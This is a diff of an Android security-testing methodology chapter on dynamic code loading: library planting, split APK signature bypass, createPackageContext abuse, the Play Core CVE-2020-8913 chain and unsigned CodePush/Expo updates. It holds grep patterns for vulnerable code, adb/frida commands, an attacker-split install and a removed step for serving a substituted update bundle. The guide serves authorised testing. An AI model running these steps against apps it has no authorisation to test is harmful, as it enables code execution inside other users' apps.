   adb shell run-as com.target.app ls -laR files/splitcompat/ 2>/dev/null
   # aim any arbitrary-write primitive at that path
@@ -616,22 +689,24 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all. Platform read-only enforcement for `System.load()` arrives at **targetSdk ≥ 37 (Android 17)** — below that there is no platform help at all. `android:extractNativeLibs` decides whether `lib-*/` even exists on disk |
+| **Requires** | native, device |
 | **Maps to** | MASWE-0049; MASTG-TECH-0041 (Library Injection); Google Mobile VRP ACE examples — "Overwriting a `.so` file with a malicious `.so` file that is executed by the victim app" |
 
-- **Test:** `System.load()` takes an absolute path; `System.loadLibrary()` resolves against
+- **Test:** Canonical here — D16-039 and D03-072 point at this item for library planting. `System.load()` takes
+  an absolute path; `System.loadLibrary()` resolves against
   `nativeLibraryDir` and `lib-*/`. Either becomes execution if the resolved file is writable — and a
   `JNI_OnLoad`/`__attribute__((constructor))` runs before any Java code can intervene. Two sub-cases:
   a `.so` the app downloads into `files/`/`cache/`, and a packaged `.so` extracted into `lib-main`/`app_lib`
   that a traversal write can overwrite.
 - **How:**
   ```bash
-  grep -n 'android:extractNativeLibs' out/AndroidManifest.xml
+  grep -n 'android:extractNativeLibs' $DEC/apktool/AndroidManifest.xml
   adb shell run-as com.target.app ls -la lib-main/ lib-1/ app_lib/ files/ cache/ 2>/dev/null
-  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' -B6 out/sources/ \
+  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' -B6 $DEC/jadx/sources/ \
     | grep -iE 'getFilesDir|getCacheDir|getDir\(|External|download'
   rabin2 -zz lib/*/*.so | grep -i dlopen
-  frida-trace -U -f com.target.app -i "dlopen*" -i "android_dlopen_ext"
-  adb shell "cat /proc/$(adb shell pidof com.target.app)/maps" | grep '\.so$' | grep -v '/data/app/'
+  frida -D "$SERIAL" -f com.target.app -t 90 -l codeload-trace.js   # the linker-level trace of D17-002 — never an Interceptor on libdl's dlopen (crashes GL/EGL init)
+  adb shell 'for p in $(pidof com.target.app); do echo "== $p"; cat /proc/$p/maps; done' | grep -E '^== |\.so$' | grep -v '/data/app/'   # root on a release build: rooted AVD
   ```
   Payload whose constructor fires on load:
   ```c
@@ -677,7 +752,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   adb logcat -d | grep -iE 'UnsatisfiedLinkError|not read-only|dex file .* is not read-only'
   ```
 - **Proof:** The exception text, plus the stack frame naming the loader — that frame is your target for
-  D17-004 / D17-033.
+  D17-004 / D17-031.
 - **Escalation:** → whichever stage precedes the load.
 - **Ruled out when:** No such exception on a device at the enforcing API level after a full walkthrough
   including an update check — which is consistent with either compliance or no dynamic loading; distinguish
@@ -688,9 +763,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | High–Critical (it is the enabling half of a write→RCE chain) |
-| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the control failure; `server_side_injection.remote_code_execution_rce` (P1) once chained |
+| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) for the control failure; `server_side_injection.remote_code_execution_rce` (P1) once chained |
 | **Attacker** | AM-03 / AM-09 |
 | **Applies to** | all apps with a module/plugin/split loader |
+| **Requires** | device |
 | **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature); Play Core `verified-splits` naming; `risks/dynamic-code-loading` `FileIntegrityChecker` sample |
 
 - **Test:** Directory names like `verified-splits`, method names like `unZipAndVerify`, and configuration
@@ -700,7 +776,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   # find the loader, then read backwards from it
-  grep -rnE 'new (DexClassLoader|PathClassLoader|InMemoryDexClassLoader)' -B40 out/sources/ \
+  grep -rnE 'new (DexClassLoader|PathClassLoader|InMemoryDexClassLoader)' -B40 $DEC/jadx/sources/ \
     | grep -nE 'Signature\.verify|MessageDigest|checkSignature|verifySignature|PublicKey|KeyFactory|Base64\.decode'
   # and read the FAILURE branch — does it throw, or log and continue?
   ```
@@ -708,7 +784,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   decompiled method; or (b) a verification call whose failure branch does not throw (fails open). A worked
   positive for contrast: a DSA-verified `unZipAndVerify` that throws on mismatch **holds**, and belongs in
   the ruled-out register with the decompiled failure branch quoted.
-- **Escalation:** → D17-008/D17-012/D17-013 to complete the chain; → D17-034 if the check exists but is
+- **Escalation:** → D17-008/D17-012/D17-013 to complete the chain; → D17-032 if the check exists but is
   not bound to a developer-held key.
 - **Ruled out when:** A signature verification against a key **not present in the payload** runs
   immediately before the loader is constructed, and its failure branch throws rather than logs. Quote both.
@@ -732,10 +808,11 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   adb shell id -Z                                            # your own context
-  adb shell "cat /proc/$(adb shell pidof com.target.app)/attr/current"
+  adb shell 'for p in $(pidof com.target.app); do echo "== $p $(cat /proc/$p/attr/current)"; done'   # every process of the app, incl. android:process / :isolated children
   adb shell ls -Z /data/data/com.target.app/files/
-  adb shell dmesg | grep -i 'avc: denied' | tail -40
-  adb logcat -b events -d | grep -i avc | tail -40
+  # AVC denials: dmesg needs root on user builds and `-b events` never carries them — read the kernel buffer
+  adb shell 'logcat -b kernel -d 2>/dev/null; logcat -b all -d' | grep -E 'avc: *denied.*(execute|execmod|execute_no_trans)' | tail -40
+  adb -s "$SERIAL" shell "su 0 dmesg" | grep 'avc: denied' | tail -40     # rooted AVD only
   ```
 - **Proof:** Either a clean execution (your marker in logcat under the victim's PID, no AVC denial), or an
   `avc: denied { execute }` line that bounds the finding to an arbitrary write.
@@ -743,7 +820,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   (D17-015), and say in both reports why the chain stops. That is a stronger report than an overclaimed
   Critical that a triager disproves.
 - **Ruled out when:** Not applicable as a negative — this item exists to prevent an overclaim. Record the
-  outcome either way.
+  outcome either way. An empty AVC list is evidence only when a positive control — your own probe app attempting
+  `exec` of a dropped ELF — produced a denial line in the same capture.
 
 ### D17-017 · Prove the code ran under the VICTIM's UID, not yours
 
@@ -753,6 +831,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | every code-execution claim in this chapter |
+| **Requires** | — |
 | **Maps to** | Google Mobile VRP exclusion: *"Tricking a user into installing an app and executing code within that app itself does not qualify"* — the code must run in the **victim** app's process |
 
 - **Test:** The single most common reason a Critical here gets downgraded is that the evidence shows the
@@ -789,6 +868,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when exploited; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if you file the version alone |
 | **Attacker** | AM-03 |
 | **Applies to** | apps bundling `com.google.android.play:core`. **LEGACY** for the library bug itself; the *shape* recurs in every module loader |
+| **Requires** | device |
 | **Maps to** | **CVE-2020-8913** — Play Core `< 1.7.2`, CVSS 8.8; Oversecured's analysis (unprotected runtime-registered receiver in `com/google/android/play/core/splitinstall/C3748l.java` and `com/google/android/play/core/listener/C3718a.java`; unvalidated `split_id` path traversal in `com/google/android/play/core/internal/ab.java`; base path `/data/user/0/{pkg}/files/splitcompat/{id}/unverified-splits/`; timeline: trigger 2020-02-26, exploit 2020-02-27, Google fix 2020-04-06, CVE assigned 2020-07-22); Play Core release notes **1.7.2 (March 2020)**; Check Point's characterisation (steal banking credentials and, with SMS permission, 2FA codes) |
 
 - **Test:** Resolve the **actual** bundled version, not the coordinate. The monolithic
@@ -800,8 +880,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   unzip -p target.apk 'META-INF/*.version' | sort -u
   unzip -l target.apk | grep -iE 'play-core|play_core|splitcompat|feature-delivery'
   grep -rn 'com.google.android.play:core\|com.google.android.play:feature-delivery' --include='*.gradle*' --include='*.toml' .
-  jadx -d out target.apk
-  grep -rn 'com/google/android/play/core/splitcompat\|SplitInstallUpdateIntentService\|split_file_intents\|unverified-splits' out/sources/
+  grep -rn 'com/google/android/play/core/splitcompat\|SplitInstallUpdateIntentService\|split_file_intents\|unverified-splits' $DEC/jadx/sources/
   ```
 - **Proof:** The resolved version string from `META-INF/*.version` or the release-notes mapping. **Worked
   negative from the corpus:** a `play:core` reference that resolved to **`feature-delivery 2.1.0`** → the
@@ -819,16 +898,17 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps bundling a vulnerable Play Core, and — as a *shape* — any update library that registers a receiver at runtime |
+| **Requires** | device |
 | **Maps to** | CVE-2020-8913; Oversecured Play Core analysis ("Attackers create malicious `Parcelable` objects containing code executed during deserialization via the `createFromParcel()` method") |
 
-- **Test:** The receiver that made CVE-2020-8913 exploitable is **registered at runtime**, so it appears in
+- **Test:** Cross-reference: D05-002 owns the runtime-registered receiver census — cite it here. The receiver that made CVE-2020-8913 exploitable is **registered at runtime**, so it appears in
   no manifest and no `drozer app.package.attacksurface` output. It exists only while the app is
   foregrounded. Generalise the check: any update/module library that calls `registerReceiver` with an
   action string is an undocumented IPC entry point.
 - **How:**
   ```bash
   # find runtime registrations the manifest does not show
-  grep -rnE 'registerReceiver\(' -A6 out/sources/ | grep -viE '^out/sources/(android|androidx)/'
+  grep -rnE 'registerReceiver\(' -A6 $DEC/jadx/sources/ | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   adb shell dumpsys activity broadcasts | grep -A5 -i com.target.app | head -60
   # the CVE-2020-8913 trigger (target must be foregrounded)
   adb shell am start -n com.target.app/.MainActivity
@@ -839,7 +919,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   ```
 - **Proof:** A `config.<x>` file present under the app's `verified-splits` directory that your app wrote,
   plus your marker in logcat under the target's PID for the full chain.
-- **Escalation:** → D17-012 landing, → D17-047/049 for the `Parcelable` stage of the original exploit.
+- **Escalation:** → D17-012 landing, → D17-046/049 for the `Parcelable` stage of the original exploit.
 - **Ruled out when:** `dumpsys activity broadcasts` shows no runtime-registered receiver belonging to the
   app's UID whose action is not also declared in the manifest, sampled while the app is foregrounded and
   during an update check.
@@ -852,15 +932,16 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 / AM-11 |
 | **Applies to** | AAB-distributed apps |
+| **Requires** | device |
 | **Maps to** | `guide/app-bundle/play-feature-delivery` — "App bundles are signed using signing configs from the base module only"; "Split APKs are verified by the Play Store before delivery"; `SplitInstallManager`, `SplitCompatApplication`, `dist:delivery`, `dist:removable` |
 
 - **Test:** Feature modules are code delivered *after* install. The signing story rests entirely on the
   delivery channel, so test what the installer does with a split supplied out of band.
 - **How:**
   ```bash
-  adb install-multiple base.apk attacker_split.apk           # mismatched signature should fail
+  adb install-multiple --no-incremental base.apk attacker_split.apk   # mismatched signature should fail. Delete any *.idsig beside the APKs first: with them present the installer silently switches to incremental mode and hides the signature verdict
   SID=$(adb shell pm install-create -p com.target.app | grep -oE '[0-9]+')
-  adb shell pm install-write -S $(wc -c < split_x.apk | tr -d " ") $SID split_x.apk /dev/stdin < split_x.apk
+  adb shell pm install-write -S "$(wc -c < split_x.apk | tr -d ' ')" "$SID" split_x.apk - < split_x.apk   # `-` reads stdin; /dev/stdin is not portable through adb
   adb shell pm install-commit $SID
   adb logcat -d | grep -iE 'INSTALL_FAILED|signature|split'
   ```
@@ -871,7 +952,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   is in the classloader.
 - **Ruled out when:** `pm install-commit` returns `INSTALL_FAILED_INVALID_APK` /
   `INSTALL_PARSE_FAILED_NO_CERTIFICATES` / a signature mismatch for every modified split you tried,
-  including one re-signed with your own key and one with the signature block stripped.
+  including one re-signed with your own key and one with the signature block stripped. The refusal string must
+  name the signature (`INSTALL_FAILED_INVALID_APK`, `…NO_CERTIFICATES`, `signatures do not match`), not the
+  install mode — `Incremental installation not allowed` or a stdin error is a harness fault, not a verdict.
 
 ### D17-021 · `createPackageContext(CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)` with prefix-only matching
 
@@ -881,19 +964,22 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all. `targetSdk ≥ 30` package visibility makes the *victim's* enumeration of your package harder (it needs a `<queries>` entry, which conveniently makes the peer list auditable) but does **not** stop a targeted attack — the attacker app can still announce itself or be launched |
+| **Requires** | device |
 | **Maps to** | `risks/create-package-context` (MASVS-CODE) — attack prerequisites: both flags plus `getClassLoader()` on the target side, package-name claim plus exported `android:appComponentFactory` on the attacker side; remediation `packageManager.checkSignatures(packageName, context.getPackageName())`; Oversecured *"Android: arbitrary code execution via third-party package contexts"* — **"at least one in every 50 popular apps"**; MASWE-0049; "My Other ClassLoader is Your ClassLoader" (Nullcon Berlin 2025 / No Hat 2024, Dimitrios Valsamaras) |
 
-- **Test:** Plugin, theme, filter, font and "companion app" architectures load code from a package
+- **Test:** Cross-reference: D02-050 covers the `appComponentFactory` half of this sink from the manifest side —
+  cite its result; this item owns the loader-side test and the worked platform-SDK negative. Plugin, theme,
+  filter, font and "companion app" architectures load code from a package
   identified by **name**. A name is not a signature. If the app prefix-matches (`startsWith("com.victim.module.")`)
   or accepts a name that is simply absent from the device, an attacker publishes a package claiming it and
   executes code inside the victim's process.
 - **How:**
   ```bash
-  grep -rn 'createPackageContext(' -B10 -A15 out/sources/
-  grep -rnE 'CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' out/sources/
-  grep -rnE 'getInstalledPackages|getInstalledApplications' -A10 out/sources/ | grep -nE 'startsWith|contains|equals'
-  grep -rn 'checkSignatures(' out/sources/          # presence is the mitigation; absence is the finding
-  grep -n '<queries>' -A20 out/AndroidManifest.xml  # the auditable peer list on targetSdk 30+
+  grep -rn 'createPackageContext(' -B10 -A15 $DEC/jadx/sources/
+  grep -rnE 'CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' $DEC/jadx/sources/
+  grep -rnE 'getInstalledPackages|getInstalledApplications' -A10 $DEC/jadx/sources/ | grep -nE 'startsWith|contains|equals'
+  grep -rn 'checkSignatures(' $DEC/jadx/sources/          # presence is the mitigation; absence is the finding
+  grep -n '<queries>' -A20 $DEC/apktool/AndroidManifest.xml  # the auditable peer list on targetSdk 30+
   ```
   The vulnerable shape to quote in the report:
   ```java
@@ -912,16 +998,23 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   session. Persistent.
 - **Ruled out when:** No `createPackageContext` call exists; or every call passes an **exact** package name
   and is preceded by `checkSignatures(...) == SIGNATURE_MATCH` (or `hasSigningCertificate` with a pinned
-  digest) whose failure branch aborts. Quote the check and its failure branch.
+  digest) whose failure branch aborts. Quote the check and its failure branch. Or — the standard worked
+  negative — every `createPackageContext` call with both flags targets a single hardcoded platform-services
+  package **and** is preceded by that SDK's own signature verifier (`GoogleSignatureVerifier` /
+  `isGooglePublicSignedPackage`, or its R8-renamed equivalent — quote the decompiled gate): record it as
+  `createPackageContext flags=3 → platform SDK loader, signature-gated`. On such apps `DelegateLastClassLoader`
+  entries over the platform-services module directory are expected in D17-003's `Java.enumerateClassLoaders()`
+  output and are not a hit.
 
 ### D17-022 · `checkSignatures` present but satisfiable — rotation and historical certificates
 
 | | |
 |---|---|
 | **Severity ceiling** | Medium standalone; it is a hard prerequisite break for the D17-021 fix |
-| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (VARIES) |
+| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps using APK Signature Scheme v3 key rotation; `GET_SIGNING_CERTIFICATES` exists from **API 28** |
+| **Requires** | device |
 | **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature) |
 
 - **Test:** The documented fix for D17-021 is a signature comparison. Test that the comparison is actually
@@ -931,7 +1024,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:**
   ```bash
   apksigner verify --print-certs --verbose base.apk
-  grep -rnE 'checkSignatures|GET_SIGNATURES|GET_SIGNING_CERTIFICATES|getApkContentsSigners|getSigningCertificateHistory|hasSigningCertificate|CERT_INPUT_SHA256' out/sources/ -A8
+  grep -rnE 'checkSignatures|GET_SIGNATURES|GET_SIGNING_CERTIFICATES|getApkContentsSigners|getSigningCertificateHistory|hasSigningCertificate|CERT_INPUT_SHA256' $DEC/jadx/sources/ -A8
   ```
 - **Proof:** The decompiled comparison using `getSigningCertificateHistory()` or comparing against a
   hardcoded digest that appears in a published older release of the peer app.
@@ -949,6 +1042,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-04 (requires `POST_NOTIFICATIONS` in the disclosed case) |
 | **Applies to** | apps that accept `RemoteViews` from another process (widget hosts, notification listeners, autofill services) or call `createPackageContext` with `CONTEXT_INCLUDE_CODE` |
+| **Requires** | device |
 | **Maps to** | **CVE-2025-22441** — installed app → SystemUI; `aInfo.createTimestamp` attacker-settable, pinning `updateApplicationInfo()`; a `<WebView>` injected into SystemUI's `SlicePermissionActivity` layout; the RemoteViews application stalled via a slow ContentProvider image load while racing `getContextForResourcesEnsuringCorrectCachedApkPaths()` with `mDefaultClassLoader` null; requires `POST_NOTIFICATIONS`; fixed August 2025. `risks/create-package-context` |
 
 - **Test:** A less-known but generalisable shape: `RemoteViews` embeds a serialized `ApplicationInfo` from a
@@ -957,9 +1051,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   the same: does this app take a *path to code or resources* from an untrusted sender?
 - **How:**
   ```bash
-  grep -rnE 'RemoteViews|ApplicationInfo|sourceDir|publicSourceDir|createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY' out/sources/ -A6
-  grep -rnE 'setImageViewUri|setRemoteAdapter|apply\(|reapply\(' out/sources/
-  grep -n 'android.permission.BIND_APPWIDGET\|BIND_NOTIFICATION_LISTENER_SERVICE\|BIND_AUTOFILL' out/AndroidManifest.xml
+  grep -rnE 'RemoteViews|ApplicationInfo|sourceDir|publicSourceDir|createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY' $DEC/jadx/sources/ -A6
+  grep -rnE 'setImageViewUri|setRemoteAdapter|apply\(|reapply\(' $DEC/jadx/sources/
+  grep -n 'android.permission.BIND_APPWIDGET\|BIND_NOTIFICATION_LISTENER_SERVICE\|BIND_AUTOFILL' $DEC/apktool/AndroidManifest.xml
   ```
 - **Proof:** The consuming process loading resources or code from a path you supplied — confirm with
   `Process.enumerateModules()` in a Frida session attached to the consumer, or by rendering an
@@ -974,19 +1068,19 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | Medium–High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the secret hand-off; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the unpinned identity |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the secret hand-off; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) for the unpinned identity |
 | **Attacker** | AM-08 |
 | **Applies to** | Android 14+ for the SDK Runtime environment (incorporated into Privacy Sandbox on Android 16) |
 | **Requires** | api>=34 |
 | **Maps to** | `privacysandbox.google.com/private-advertising/sdk-runtime` — separate SDK Runtime process, "No app data access", "Permission limitations", "File access constraints", "IPC restrictions", "Activity access: Controlled through `SdkSandboxActivityHandler`"; `SdkSandboxManager`, `loadSdk()`, `SandboxedSdkProvider`, `SdkSandboxController`, `<uses-sdk-library>`, `certDigest`; `about/versions/16/features` |
 
-- **Test:** The SDK Runtime moves a runtime-enabled SDK into a separate process with no access to the app's
+- **Test:** Cross-reference: D22-039 owns the SDK Runtime pinning test — cite it here. The SDK Runtime moves a runtime-enabled SDK into a separate process with no access to the app's
   data directory. Two testable questions survive that: (1) does the app hand secrets across the boundary
   anyway, defeating the point; (2) is the SDK's identity pinned by `certDigest`?
 - **How:**
   ```bash
-  grep -n -A3 'uses-sdk-library' out/AndroidManifest.xml     # android:certDigest present and non-placeholder?
-  grep -rnE 'SdkSandboxManager|loadSdk|SandboxedSdkProvider|SdkSandboxController|SdkSandboxActivityHandler' out/sources/
+  grep -n -A3 'uses-sdk-library' $DEC/apktool/AndroidManifest.xml     # android:certDigest present and non-placeholder?
+  grep -rnE 'SdkSandboxManager|loadSdk|SandboxedSdkProvider|SdkSandboxController|SdkSandboxActivityHandler' $DEC/jadx/sources/
   adb shell ps -A | grep sdk_sandbox
   adb shell dumpsys sdk_sandbox 2>/dev/null
   ```
@@ -1016,26 +1110,35 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `insecure_data_transport.executable_download.secure_integrity_check` (P5) if the channel is verified; `…no_secure_integrity_check` (P4) if not |
 | **Attacker** | n/a for the discovery step |
 | **Applies to** | all |
-| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")`/`("ServerUrl")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); expo `UpdatesConfiguration.kt`; HackTricks *insecure-in-app-update-rce* ("Quick triage: does the app have an in-app updater?") |
+| **Requires** | — |
+| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")`/`("ServerUrl")`, the hosted App Center service behind the old default `mServerUrl` was retired on 2025-03-31 — a live deployment names a standalone `code-push-server` or community fork in `CodePushServerUrl`, and the client still honours `CodePushPublicKey`); expo `UpdatesConfiguration.kt`; HackTricks *insecure-in-app-update-rce* ("Quick triage: does the app have an in-app updater?") |
 
 - **Test:** Establish that a post-install code channel exists and where it points, before testing anything
   about it. This must be stated in the report's methodology section regardless of outcome.
 - **How:**
   ```bash
-  # CodePush
-  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' out/res/values/strings.xml
-  grep -rn 'com.microsoft.codepush.react.CodePush' out/sources/ | head
+  # CodePush — the hosted App Center service was retired on 2025-03-31: a LIVE deployment must name a self-hosted
+  # or third-party server in CodePushServerUrl; a deployment key with no server URL is a dead channel — record that
+  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' $DEC/apktool/res/values/strings.xml
+  grep -rn 'com.microsoft.codepush.react.CodePush' $DEC/jadx/sources/ | head
   # expo-updates
-  grep -nE 'expo\.modules\.updates\.' out/AndroidManifest.xml
+  grep -nE 'expo\.modules\.updates\.' $DEC/apktool/AndroidManifest.xml
   # Cordova / Capacitor live update
   grep -rniE 'hot.?code.?push|live.?update|appflow|ionic-deploy|updateUrl|channel' \
-    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
+    $DEC/apktool/res/xml/config.xml $DEC/apktool/assets/capacitor.config.json $DEC/apktool/assets/www/cordova_plugins.js 2>/dev/null
   # generic custom updater: strings and endpoints
-  grep -rniE 'update|plugin|patch|upgrade|hotfix|bundle|feature|splitcompat|splitinstall|appUpdate|local-testing|tinker' out/sources/ \
+  grep -rniE 'update|plugin|patch|upgrade|hotfix|bundle|feature|splitcompat|splitinstall|appUpdate|local-testing|tinker' $DEC/jadx/sources/ \
     | grep -iE 'http|download|endpoint' | head -40
   # anything the search above missed
-  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|loadScriptFromFile' out/sources/ | head
+  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|loadScriptFromFile' $DEC/jadx/sources/ | head
+  # platform-vendor first-party apps: three channels, none of them an OTA SDK — remote config, managed file
+  # download and dynamic feature modules. Each hit is a code or config channel; route it to the item named
+  grep -rlE 'PhenotypeFlag|ConfigurationUpdatedReceiver|com/google/android/libraries/phenotype' $DEC/jadx/sources/ | head      # remote config → D17-037
+  grep -rlE 'MobileDataDownload|com/google/android/libraries/mobiledatadownload|DataFileGroup' $DEC/jadx/sources/ | head      # managed file download → D17-031/032 (config-held hash: position (b))
+  grep -rlE 'DynamiteModule|dynamite|DelegateLastClassLoader' $DEC/jadx/sources/ | head                                       # dynamic modules → D17-003 / D17-021 (signature-gated loader)
   ```
+  Record the three verdicts (config channel, file-download channel, module channel) in the methodology section
+  even when all three are empty.
 - **Proof:** A deployment key plus a server URL in `strings.xml`, or `expo.modules.updates.EXPO_UPDATE_URL`
   in the manifest, plus a `getJSBundleFile()` override returning `CodePush.getJSBundleFile()`; or the
   update endpoint observed in the proxy.
@@ -1051,31 +1154,18 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) — override with the execution proof |
 | **Attacker** | AM-09 (update host / CDN / EAS itself) and AM-06 where TLS is the only control (see D14) |
 | **Applies to** | Expo and bare RN apps using expo-updates |
+| **Requires** | react-native, device |
 | **Maps to** | expo `UpdatesConfiguration.kt` meta-data keys `expo.modules.updates.CODE_SIGNING_CERTIFICATE`, `CODE_SIGNING_METADATA`, `CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN`, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`, `EXPO_UPDATE_URL`, `EXPO_RUNTIME_VERSION`, `EXPO_UPDATES_CHECK_ON_LAUNCH`, `ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE`, `DISABLE_ANTI_BRICKING_MEASURES`, `UpdatesController.overrideConfiguration()`; Expo code-signing docs ("the update is verified against the embedded certificate and included signature … rejected otherwise"; without it "ISPs, CDNs, cloud providers, and even EAS itself" could tamper); HackerOne's guidance on the class at `hackerone.com/blog/ensuring-mobile-application-security-expo` |
 
-- **Test:** expo-updates verifies an update **only** when a code-signing certificate is configured. If
-  `CODE_SIGNING_CERTIFICATE` is absent, or `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is `true`, the only thing
-  protecting the app's executable code is TLS to the update host.
-- **How:**
-  ```bash
-  grep -nE 'expo\.modules\.updates\.(CODE_SIGNING_CERTIFICATE|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN)' out/AndroidManifest.xml
-  grep -nE 'expo\.modules\.updates\.(EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|DISABLE_ANTI_BRICKING_MEASURES)' out/AndroidManifest.xml
-  adb shell "run-as com.target.app ls -laR files/.expo-internal/"
-  adb shell "run-as com.target.app cat shared_prefs/dev.expo.updates.prefs.xml"
-  # then redirect the manifest request to a host you control and serve your own bundle
-  mitmproxy --set block_global=false -s redirect_expo.py
-  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
-  ```
-- **Proof:** Your bundle executing in the victim app after nothing but a restart and with no reinstall —
-  a new screen, a marker in logcat, or an outbound beacon from the app's process. Use an 8+ character random
-  marker (`PWNMARK7f3a91`), and grep the **baseline** bundle for that marker first so the proof is not a
-  collision.
-- **Escalation:** Steal every user's session (D13), read local storage (D11), reach every native module the
-  RN bridge exposes (D10/D19). Affects every installed device on that channel.
-- **Ruled out when:** `CODE_SIGNING_CERTIFICATE` is present, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is
-  absent or `false`, and a manifest served with a broken signature is **rejected** — demonstrate the
-  rejection, do not infer it from the config key. A config key without an enforcement test is not a
-  ruled-out.
+- **Test:** Pointer — D19-026 owns this test (title-for-title duplicate; the framework chapter keeps the
+  mechanism). Run it there, record the verdict there, and mirror the row here as `ruled-out: see D19-026 note` or
+  `finding: F-0NN via D19-026`. The D17-specific addition is the execution proof of D17-017 (your code running
+  under the victim's UID after the substitution) and the marker discipline of D17-080.
+- **How:** see D19-026; the substitution proof follows D17-017.
+- **Proof:** as D19-026, plus the D17-017 execution artefact.
+- **Escalation:** as D19-026; → D17-079 for the chain-filing order.
+- **Ruled out when:** D19-026 is ruled out with its enforcement test demonstrated (a tampered manifest or bundle
+  rejected at runtime — config presence alone is not enough); mirror its note verbatim here.
 
 ### D17-027 · CodePush without `CodePushPublicKey` — no bundle signature verification
 
@@ -1085,25 +1175,18 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
 | **Attacker** | AM-09 / AM-06 |
 | **Applies to** | React Native + react-native-code-push |
